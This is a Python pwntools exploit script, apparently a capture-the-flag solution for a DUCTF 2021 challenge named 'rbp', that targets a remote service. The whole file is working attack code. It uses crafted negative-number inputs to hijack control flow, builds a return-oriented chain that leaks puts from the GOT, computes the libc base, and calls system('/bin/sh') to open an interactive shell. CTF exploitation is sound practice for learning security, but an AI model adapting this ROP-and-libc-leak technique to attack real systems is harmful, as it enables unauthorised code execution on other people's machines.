from pwn import *

#s = process('./rbp')
s = remote('pwn-2021.duc.tf', 31910)

#raw_input('DEBUG')

pop_rdi = 0x00000000004012b3
ret = 0x000000000040101a
puts_got = 0x0000000000404018
puts_plt = 0x0000000000401030
puts_offset = 0x809d0
system_offset = 0x04fa60
bin_sh_offset = 0x1abf05
main = 0x00000000004011d5
main_not_push = 0x00000000004011d6

s.sendafter(b'name? ', b'Cobra')

s.sendafter(b'number? ', b'-72\x00\x00\x00\x00\x00' + p64(main_not_push) + p64(main)[:3])

payload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
s.sendafter(b'name? ', payload)

s.sendafter(b'number? ', b'-40\x00\x00\x00\x00\x00')

puts_leak = int.from_bytes(s.recv(6).strip(), byteorder = 'little', signed = False)

libc_base = puts_leak - puts_offset
system = libc_base + system_offset
bin_sh = libc_base + bin_sh_offset

payload = p64(pop_rdi) + p64(bin_sh) + p64(system)
s.sendafter(b'name? ', payload)

s.sendafter(b'number? ', b'-40\x00\x00\x00\x00\x00')

s.interactive()
